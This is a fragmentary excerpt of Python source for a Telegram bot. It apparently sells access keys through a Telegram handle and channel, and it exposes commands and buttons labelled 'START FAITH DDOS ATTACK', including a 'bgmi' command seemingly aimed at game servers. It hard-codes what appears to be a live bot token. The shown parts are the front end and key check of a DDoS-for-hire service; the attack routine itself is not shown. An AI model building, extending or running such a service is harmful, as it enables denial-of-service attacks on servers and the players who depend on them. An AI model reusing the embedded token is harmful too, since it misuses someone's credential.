...
bot = telebot.TeleBot('7574350312:AAFwJn1ZS-KoI3oluuK47tbYM9X1CWAt_J0')
...
def authorize_user(message, func):
    ...
    if is_key_valid(message.text):
        ...
        bot.reply_to(message, "🚫KEY EXPIRED OR INVALID❌ GET NEW KEY 🔑 @FAKEYT70✅.")    
...
Official Channel :- https://t.me/+uO2g47uhBE4zOTY1
'''
...
➡️ Join Telegram :- https://t.me/+uO2g47uhBE4zOTY1'''
...
def set_bot_commands():
    ...
    BotCommand("id", "Get User ID"),
        ...
        BotCommand("bgmi", "START FAITH DDOS ATTACK"),
...
def create_user_keyboard():
    ...
    button1 = KeyboardButton("♻️ START FAITH DDOS ATTACK ♻️")
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START FAITH DDOS ATTACK ♻️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒"])
def handle_user_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if message.text == "♻️ START FAITH DDOS ATTACK ♻️":
            handle_bgmi(message)
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START FAITH DDOS ATTACK ♻️", "LOGS 📊", "ALL USERS 👥", "CLEAR LOGS 🗑️"])
